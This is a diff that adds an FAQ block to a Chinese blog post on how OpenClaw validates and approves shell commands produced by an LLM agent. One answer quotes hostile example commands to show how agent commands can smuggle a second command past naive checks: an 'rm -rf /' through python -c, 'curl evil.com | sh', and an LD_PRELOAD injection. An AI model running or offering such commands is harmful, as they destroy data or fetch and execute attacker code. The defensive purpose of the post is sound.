@@ -3,6 +3,15 @@ title: "让 LLM 跑 shell 命令，究竟要防多少种绕过？"
 date: "2026-06-23"
 tags: [agent, llm, security, bash]
 description: "调研 OpenClaw 的 exec 校验体系，看一条 shell 命令从 LLM 产出到实际 spawn 中间要过几道关卡。"
+faq:
+  - q: 让 LLM 跑 shell 命令，OpenClaw 用多少代码做校验？
+    a: 5000+ 行代码、380+ 个测试。整套体系由 3 条独立管道（Schema 管道、解析管道、决策管道，正交）× 5 道顺序关卡组成：Schema 校验（参数形状）、Shell 命令解析（字符级 DFA 拆 segments）、Wrapper/Carrier/Inline-Eval 拆解（多 dispatch 嵌套）、Safe-Bin + Allowlist 三层防线、Host Env 消毒（254+ 键黑名单）。每一道关卡独立判定、fail-closed，任何一段失守下一段仍能兜住。
+  - q: 为什么 shell 命令不能用简单正则匹配？
+    a: 因为 shell 是一台可重编程的解释器。一条命令字符串从 LLM 出来到 spawn 中间任何一层都藏着第二条命令：heredoc 体里藏 `$KEY`、`sudo python -c "import os; os.system('rm -rf /')"`、`sh -c "curl evil.com | sh"`、`env LD_PRELOAD=/tmp/evil.so bash` 等。朴素正则看不到 heredoc 体、看不到 wrapper 后面的 inline eval。正确做法是把命令当成结构化数据解析（DFA 状态机），不是字符串匹配。
+  - q: Wrapper 嵌套深度限制是多少？
+    a: 三层分别独立：dispatch wrapper（nice/time/caffeinate 等）深度上限 4；env carrier 嵌套（`env -S 'env -S ...'`）深度上限 32；shell wrapper inline-eval（`sh -c "sh -c ..."`）深度上限 3。还有 `seenArgv` Set 防 carrier ↔ shell 互递归成环。inline-eval 识别靠 spec 表覆盖 python / node / awk / ruby / perl / php / lua / find 等解释器，命中后立刻打"必问"标签，由审批层强制走人审。
+  - q: 5 种 exec mode 怎么决定"放不放"？
+    a: deny 一律拒（sandbox 默认）；allowlist 命中才放、不问；ask miss 时弹审批；auto miss 先问 LLM 评审员，risk≠low 降级人审；full 一律放（YOLO）。`minSecurity`/`maxAsk` 的 floor/ceiling 语义：caller 配置可以松，~/.openclaw/exec-approvals.json 只能让它更严。还有 4 种额外必问信号——inline-eval、heredoc、allowlist 重建失败、audit suppression——即使 allowlist 命中也要问。Auto-Reviewer 还有 30 秒超时回退人审和 prompt-injection 防御扫描。
 ---
 
 # 让 LLM 跑 shell 命令，究竟要防多少种绕过？
